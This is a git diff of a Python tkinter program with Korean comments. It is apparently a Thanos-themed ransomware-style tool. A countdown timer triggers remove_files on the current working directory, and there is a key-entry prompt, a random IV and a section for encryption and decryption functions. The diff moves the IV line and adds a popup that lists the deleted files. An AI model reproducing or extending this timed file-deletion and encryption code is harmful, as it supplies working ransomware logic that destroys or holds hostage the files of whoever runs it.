@@ -14,10 +14,10 @@ gui랑 통합하고 있는 게 integrate_gui
 import tkinter
 from testFile import thanos
 
+iv = os.urandom(16)
 timeLimit = 5
 
 # /////////////////////////////////////////////////////////////////////////////////////////////////////////////////gui 관련 함수&코드
-
 
 class tk:
     def __init__(self):
@@ -55,6 +55,7 @@ class tk:
         self.l_input = tkinter.Label(self.window, text="키가 입력되었다 => " + pw, fg="red", bg="black", font="Helvetica 18 bold")
         self.l_input.pack()
         self.pwbutton.destroy()
+    '''
     def imagechange(self):
         # gif 출력
         self.l_thanos.destroy()
@@ -65,9 +66,7 @@ class tk:
         self.l_thanos.destroy()
         self.l_thanos = tkinter.Label(gui.self.frame2, image=gui.thanos)
         self.l_thanos.pack()
-
-
-iv = os.urandom(16)
+    '''
 
 #/////////////////////////////////////////////////////////////////////////////////////////////////////////////////파일 리스팅 함수
 
@@ -100,12 +99,13 @@ def clock(gui,c):
     if c==-2:
         remove_files(gui, os.getcwd())
         return;
+
     gui.l_timer.config(text=str(c+1))
     threading.Timer(1, clock, [gui, c]).start()
 
 def remove_files(gui,path,ext=None):
     gui.l_thanos.destroy()
-    gui.l_thanos = thanos.AnimatedGIF(gui.window, "../ui/thanos1.gif")
+    gui.l_thanos = thanos.AnimatedGIF(gui.window, "../ui/thanos1.gif")  #배포할 때 경로?
     gui.l_thanos.pack()
 
     remove_filelist=[]
@@ -119,6 +119,16 @@ def remove_files(gui,path,ext=None):
             elif name.endswith(ext):
                 remove_filelist.append(name)
     print("remove_filelist: \n", remove_filelist)
+
+    #지운 파일 출력 #새창으로 띄우기
+    gui.listWindow = tkinter.Toplevel(gui.window)
+    gui.listWindow.title('삭제된 리스트')
+    gui.listWindow.geometry("800x400")
+    gui.listWindow.configure(background="black")
+    gui.list = tkinter.Label(gui.listWindow, text=remove_filelist, background="black")
+    gui.list.pack()
+    ####
+
     # 파일이 2개 이상일 경우
     if (len(remove_filelist) >= 2):
         n = 0
@@ -148,8 +158,6 @@ def remove_files(gui,path,ext=None):
     gui.l_thanos.pack()
 
     clock(gui, 5)
-
-
 
 
 #/////////////////////////////////////////////////////////////////////////////////////////////////////////////암호화 복호화 함수
